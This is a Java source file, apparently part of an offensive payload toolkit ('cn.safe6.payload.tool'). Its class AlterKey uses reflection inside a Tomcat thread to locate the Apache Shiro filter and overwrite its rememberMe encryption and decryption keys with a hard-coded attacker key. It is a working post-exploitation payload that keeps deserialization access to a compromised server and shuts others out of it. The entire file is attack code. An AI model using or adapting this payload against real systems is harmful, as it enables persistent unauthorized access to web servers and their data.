package cn.safe6.payload.tool;
import java.util.Map;

public class AlterKey {

    public AlterKey() {

        try {
            byte[] key = java.util.Base64.getDecoder().decode("2AvVhdsgUs0FSA3SDFAdag==") ;
            org.apache.tomcat.util.threads.TaskThread thread = (org.apache.tomcat.util.threads.TaskThread) Thread.currentThread();
            java.lang.reflect.Field field = thread.getClass().getSuperclass().getDeclaredField("contextClassLoader");
            field.setAccessible(true);
            Object obj = field.get(thread);
            field = obj.getClass().getSuperclass().getSuperclass().getDeclaredField("resources");
            field.setAccessible(true);
            obj = field.get(obj);
            field = obj.getClass().getDeclaredField("context");
            field.setAccessible(true);
            obj = field.get(obj);
            field = obj.getClass().getSuperclass().getDeclaredField("filterConfigs");
            field.setAccessible(true);
            obj = field.get(obj);
            java.util.HashMap objMap = (java.util.HashMap) obj;
            java.util.Iterator entries = objMap.entrySet().iterator();
            while (entries.hasNext()) {
                java.util.Map.Entry entry = (Map.Entry) entries.next();
                if (entry.getKey().equals("shiroFilter")) {
                    obj = entry.getValue();
                    field = obj.getClass().getDeclaredField("filter");
                    field.setAccessible(true);
                    obj = field.get(obj);
                    field = obj.getClass().getSuperclass().getDeclaredField("securityManager");
                    field.setAccessible(true);
                    obj = field.get(obj);
                    field = obj.getClass().getSuperclass().getDeclaredField("rememberMeManager");
                    field.setAccessible(true);
                    obj = field.get(obj);
                    java.lang.reflect.Method setEncryptionCipherKey = obj.getClass().getSuperclass().getDeclaredMethod("setEncryptionCipherKey", new Class[]{byte[].class});
                    setEncryptionCipherKey.invoke(obj,new Object[]{key});
                    java.lang.reflect.Method setDecryptionCipherKey = obj.getClass().getSuperclass().getDeclaredMethod("setDecryptionCipherKey", new Class[]{byte[].class});
                    setDecryptionCipherKey.invoke(obj,new Object[]{key});

                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
